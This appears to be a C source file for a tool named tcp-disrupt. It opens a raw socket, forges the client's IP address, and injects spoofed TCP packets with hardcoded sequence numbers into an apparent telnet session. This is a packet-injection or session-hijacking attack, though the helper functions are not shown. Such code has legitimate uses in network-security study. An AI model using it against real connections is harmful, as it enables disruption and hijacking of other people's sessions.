#include "tcp-disrupt.h"

static const struct option longOpts[] = {
    { "client", required_argument, NULL, 'c' },
    { "server", required_argument, NULL, 's' },
    { "port", required_argument, NULL, 'p' },
    { "interface", optional_argument, NULL, 'i' },
    { NULL, no_argument, NULL, 0 }
};

static const char *optString = "p:c:s:i:h?";

int main(int argc, char **argv) {
    int sock, one = 1;
    int opt = 0, longIndex = 0;

    //Setup
    char *clientIP;
    char *serverIP;
    char *interface = NULL;
    int clientPort = 23;
    int serverPort = 59590;
    int packet_size = 44;

    //Ethernet header + IP header + TCP header + data
    char packet[packet_size];

    //Address struct to sendto()
    struct sockaddr_in addr_in;

    while((opt = getopt_long(argc, argv, optString, longOpts, &longIndex)) != -1) {
        switch( opt ) {
            case 'c':
                clientIP = optarg; 
                break;
            case 's':
                serverIP = optarg;
                break;
            case 'i':
                interface = optarg;
                break;
            case 'p':
                clientPort = atoi(optarg);
                break;     
            case 'h':   /* h or --help */
            case '?':
                display_usage(argv[0]);
                break;     
            default:
                /* Shouldn't get here */
                break;
        }
    }
  
    // TODO: Remove this
    if(interface != NULL) {
        printf("Interface %s\n", interface);
    }

    //Raw socket without any protocol-header inside
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error while creating socket");
        exit(-1);
    }

    //Set option IP_HDRINCL (headers are included in packet)
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
        perror("Error while setting socket options");
        exit(-1);
    }

    //Populate address struct
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = htons(serverPort);
    addr_in.sin_addr.s_addr = inet_addr(serverIP);

    //Allocate mem for ip and tcp headers and zero the allocation
  
 
    //Send lots of packets
    int k = 5;
    while(k--) { 
        gen_packet( clientIP,
                    serverIP,
                    serverPort,
                    clientPort,
                    0, //syn
                    1, //ack
                    4012204404, //seq
                    2948134111, //syn_ack
                    'z', //data
                    packet,
                    packet_size);
        send_packet(sock, packet, addr_in);
        // TODO: Remove this break
        break;
    }
  
    return 0;
}

/**
 * Prints out the usage string of this program.
 * @param name String containing the name of the program.
 */
void display_usage(char *name) {
    printf("%s <--client client_ip> <--server server_ip> [--port port] [--interface interface]\n", name);
    exit(EXIT_SUCCESS);
}